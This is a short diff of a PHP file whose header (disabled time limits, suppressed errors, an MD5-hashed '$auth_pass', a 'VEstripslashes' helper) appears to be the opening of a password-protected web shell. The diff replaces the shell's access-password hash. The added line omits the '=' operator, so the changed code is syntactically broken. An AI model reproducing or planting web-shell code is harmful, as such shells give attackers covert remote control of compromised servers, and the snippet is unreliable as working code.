@@ -1,7 +1,7 @@
 <?php
 set_time_limit(0);
 error_reporting(0);
-$auth_pass ="8512d8f86674e3c4332b399f0961bf26"; //
+$auth_pass "0da4e7e4b3d801ec15fdba7e504718aa"; //
 if(get_magic_quotes_gpc()) {   
 function VEstripslashes($array) {     
 return is_array($array) ? array_map('VEstripslashes', $array) : stripslashes($array);   }   
